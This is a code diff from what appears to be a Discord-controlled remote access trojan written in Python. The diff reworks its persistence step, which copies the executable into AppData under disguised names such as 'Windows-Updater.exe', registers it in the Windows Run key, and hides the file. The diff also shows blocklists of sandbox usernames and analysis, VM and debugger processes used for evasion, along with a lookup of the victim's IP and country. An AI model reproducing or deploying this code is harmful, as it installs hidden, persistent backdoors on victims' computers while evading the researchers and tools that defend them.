@@ -180,13 +180,6 @@ async def on_ready():
         ldata = json.loads(url.read().decode())
         cflag = ldata['country_code']
         ipaddress = ldata['IPv4']
-    if autostart != False:
-        path = sys.argv[0]
-        if (sys.argv[0].endswith("exe")):
-            backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
-            if not os.path.exists(backdoor_location):
-                shutil.copyfile(sys.executable, backdoor_location)
-                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f', shell=True)
 
     user = os.getlogin()
     host_id = socket.gethostname()
@@ -952,19 +945,20 @@ def mainfunc():
     bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     bltask = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')
 
-    if sys.argv[0].endswith("exe"):
-        backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows HD Visual Drivers.exe"
-        if not os.path.exists(backdoor_location):
-            shutil.copyfile(sys.executable, backdoor_location)
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            command = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v visuals /t REG_SZ /d "' + backdoor_location + '" /f'
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "visuals", 0, winreg.REG_SZ, command)
-            winreg.CloseKey(key)
-            subprocess.call(command, shell=True)
-            p = os.popen('attrib +h "' + backdoor_location + '"')
-            t = p.read()
-            p.close()
+    if autostart != False:
+        if sys.argv[0].endswith("exe"):
+            backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows-Updater.exe"
+            if not os.path.exists(backdoor_location):
+                shutil.copyfile(sys.executable, backdoor_location)
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                command = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v visuals /t REG_SZ /d "' + backdoor_location + '" /f'
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "visuals", 0, winreg.REG_SZ, command)
+                winreg.CloseKey(key)
+                subprocess.call(command, shell=True)
+                p = os.popen('attrib +h "' + backdoor_location + '"')
+                t = p.read()
+                p.close()
     
     result = subprocess.getoutput("tasklist")
     numb = len(result)
